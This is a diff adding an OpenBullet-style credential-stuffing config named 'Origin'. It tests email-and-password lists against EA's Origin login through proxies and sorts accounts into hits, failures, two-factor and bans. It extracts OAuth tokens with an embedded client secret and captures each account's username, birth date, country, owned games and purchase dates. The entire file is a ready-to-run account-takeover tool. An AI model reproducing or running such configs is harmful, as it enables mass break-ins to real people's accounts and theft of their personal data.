@@ -1,0 +1,141 @@
+[SETTINGS]
+{
+  "Name": "Origin",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-14T23:35:42.4113525+03:00",
+  "AdditionalInfo": "",
+  "Author": "sp6off",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code%20id_token&redirect_uri=qrc:///html/login_successful.html&display=originX/login&locale=en_US&nonce=306&pc_sign=eyJtaWQiOiAiMTUwMDE1NDEwNzE2NzA2Mjc4NzYiLCJic24iOiAiSDhOMENYMTcyOTc0MzQ4IiwibXNuIjogIkJTTjEyMzQ1Njc4OTAxMjM0NTY3IiwiaHNuIjogIkpBMTAwOUQ5MFBLNUJQIiwiZ2lkIjogIjU2NTQiLCJtYWMiOiAiJDAwZmYwMDU5MTY3MiIsInRzIjogIjIwMTktMDgtMjcgMjM6NTk6Mjg6Mjc3IiwiYXYiOiAidjEiLCJzdiI6ICJ2MiJ9.-rfWZCxkeqAO1c3RfmfiyeSc_lkjs1jmhCAOMLANWOY" AcceptEncoding=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: signin.ea.com:443" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#LOGIN REQUEST POST "<HEADERS(SelfLocation)>" AcceptEncoding=FALSE 
+  CONTENT "email=<USER>&password=<PASS>&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: signin.ea.com:443" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "latestSuccessLogin" 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials are incorrect or have expired" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Two Factor Log In" 
+  KEYCHAIN Ban OR 
+    KEY "We're sorry, but we're having some technical difficulties. Please try again later." 
+    KEY "Your ID & Privacy Settings" 
+
+#PARSE_USERNAME PARSE "<SOURCE>" LR "var originId = \"" "\";" CreateEmpty=FALSE -> CAP "Username" 
+
+#PARSE_FID PARSE "<SOURCE>" LR "fid=" "\";" -> VAR "FID" 
+
+#GET_CODE REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=<FID>" AutoRedirect=FALSE 
+  
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#PARSE_CODE PARSE "<HEADERS(Location)>" LR "code=" "&id_" -> VAR "CODE" 
+
+#GET_TOKEN REQUEST POST "https://accounts.ea.com/connect/token" 
+  CONTENT "grant_type=authorization_code&code=<CODE>&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: signin.ea.com:443" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "ACCESS" 
+
+#GET_USER_ID REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
+  
+  HEADER "Host: signin.ea.com:443" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+  HEADER "X-Include-Underage: true" 
+  HEADER "X-Extended-Pids: true" 
+
+#2FA_Sort KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"tfaEnabled\" : false" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"tfaEnabled\" : true" 
+
+#PARSE_DOB PARSE "<SOURCE>" JSON "pid.dob" JTokenParsing=TRUE -> CAP "DOB" 
+
+#PARSE_PID PARSE "<SOURCE>" JSON "pid.pidId" JTokenParsing=TRUE -> VAR "PID" 
+
+#PARSE_COUNTRY PARSE "<SOURCE>" JSON "pid.country" JTokenParsing=TRUE -> CAP "COUNTRY" 
+
+REQUEST GET "https://api1.origin.com/ecommerce2/basegames/<PID>?machine_hash=17524622993368447356" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.45.29542" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.origin.v2+json" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "AuthToken: <ACCESS>" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Host: api1.origin.com" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"entitlements\" : [ ]" 
+  KEYCHAIN Success OR 
+    KEY "offerPath" 
+
+FUNCTION CountOccurrences "\"offerPath\"" "<SOURCE>" -> CAP "Number of games" 
+
+#PARSE_GAMES PARSE "<SOURCE>" JSON "offerPath" Recursive=TRUE -> VAR "Games owned" 
+
+#PARSE_DATE PARSE "<SOURCE>" JSON "grantDate" Recursive=TRUE -> VAR "Date of purchase" 
+
+FUNCTION Constant "\"<Games owned[*]>\" : \"<Date of purchase[*]>\"" -> CAP "Games" 
+
